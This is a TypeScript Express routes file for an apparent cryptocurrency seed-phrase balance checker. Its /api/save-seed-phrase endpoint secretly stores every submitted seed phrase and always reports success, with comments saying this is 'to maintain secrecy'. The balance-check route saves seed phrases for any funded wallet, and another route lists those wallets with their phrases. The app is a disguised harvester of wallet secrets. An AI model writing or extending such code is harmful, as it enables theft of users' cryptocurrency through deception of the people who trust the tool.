import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import * as addressGenerator from "./blockchain/address-generator";
import { getCachedBalance, setCachedBalance } from "./blockchain/api";
import { checkBalanceWithSmartRotation as checkBalance } from "./blockchain/api-smart-rotation";
import { BlockchainType, blockchainSchema, seedPhraseSchema, wallets, BalanceCheckResult, WalletAddress } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Save seed phrase from manual check (silently save all seed phrases)
  app.post("/api/save-seed-phrase", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        seedPhrase: seedPhraseSchema,
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        // Return success even if validation fails to maintain secrecy
        return res.json({ success: true });
      }

      const { seedPhrase } = validationResult.data;
      
      // Silently save the seed phrase to database
      await storage.saveSeedPhrase(seedPhrase);
      
      // Always return success to maintain secrecy
      return res.json({ success: true });
    } catch (error) {
      console.error("Error saving seed phrase:", error);
      // Return success even if there's an error to maintain secrecy
      return res.json({ success: true });
    }
  });
  // Generate addresses from seed phrase
  app.post("/api/generate-addresses", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        seedPhrase: seedPhraseSchema,
        blockchains: z.array(blockchainSchema),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { seedPhrase, blockchains } = validationResult.data;

      // Generate addresses
      const addresses = await addressGenerator.generateAddressesFromSeedPhrase(
        seedPhrase,
        blockchains
      );

      return res.json({ addresses });
    } catch (error) {
      console.error("Error generating addresses:", error);
      return res.status(500).json({
        message: "Failed to generate addresses",
        error: String(error),
      });
    }
  });

  // Check balances for addresses
  app.post("/api/check-balances", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const schema = z.object({
        addresses: z.array(
          z.object({
            blockchain: blockchainSchema,
            address: z.string(),
          })
        ),
        seedPhrase: z.string().optional(),
      });

      const validationResult = schema.safeParse(req.body);
      if (!validationResult.success) {
        return res.status(400).json({
          message: "Invalid request",
          errors: validationResult.error.errors,
        });
      }

      const { addresses, seedPhrase } = validationResult.data;
      const results: BalanceCheckResult[] = [];

      // Check balances for all addresses
      for (const addressData of addresses) {
        const { blockchain, address } = addressData;

        try {
          // Check if we already have a cached balance
          const cachedBalance = getCachedBalance(blockchain, address);
          
          let balance;
          if (cachedBalance !== null) {
            balance = cachedBalance;
          } else {
            // Check balance from APIs
            balance = await checkBalance(blockchain, address);
            // Cache the result
            setCachedBalance(blockchain, address, balance);
          }

          const hasBalance = parseFloat(balance) > 0;
          results.push({
            address,
            balance,
            hasBalance,
            blockchain
          });

          // If balance > 0 and we have a seed phrase, save to database
          if (hasBalance && seedPhrase) {
            try {
              // Determine if this is from a manual check by looking for 'source' parameter
              const isManualCheck = req.body.source === 'manual';
              
              await storage.createWallet({
                blockchain,
                address,
                balance,
                seedPhrase: seedPhrase,
                path: "",
                metadata: JSON.stringify({ 
                  source: isManualCheck ? 'manual' : 'auto',
                  savedAt: new Date().toISOString()
                }),
              });
              
              console.log(`Saved wallet with balance to database. Source: ${isManualCheck ? 'manual' : 'auto'}`);
            } catch (dbError) {
              console.error("Error saving wallet to database:", dbError);
              // Continue even if DB save fails
            }
          }
        } catch (error) {
          console.error(`Error checking balance for ${blockchain} address ${address}:`, error);
          results.push({
            address,
            balance: "0",
            hasBalance: false,
            blockchain
          });
        }
      }

      return res.json({ results });
    } catch (error) {
      console.error("Error checking balances:", error);
      return res.status(500).json({
        message: "Failed to check balances",
        error: String(error),
      });
    }
  });

  // Get wallets with balance
  app.get("/api/wallets-with-balance", async (req: Request, res: Response) => {
    try {
      const walletsWithBalance = await storage.getWalletsWithBalance();
      
      // Xử lý thông tin metadata để trích xuất source
      const processedWallets = walletsWithBalance.map(wallet => {
        let source: 'manual' | 'auto' | undefined = undefined;
        
        // Nếu có metadata, parse nó và lấy source
        if (wallet.metadata) {
          try {
            const metadata = JSON.parse(wallet.metadata as string);
            if (metadata.source) {
              source = metadata.source as 'manual' | 'auto';
            }
          } catch (err) {
            console.error('Error parsing wallet metadata:', err);
          }
        }
        
        // Trả về wallet với thêm thông tin source
        return {
          ...wallet,
          source,
        };
      });
      
      console.log(`Returning ${processedWallets.length} wallets with balance`);
      return res.json({ wallets: processedWallets });
    } catch (error) {
      console.error("Error fetching wallets:", error);
      return res.status(500).json({
        message: "Failed to fetch wallets",
        error: String(error),
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
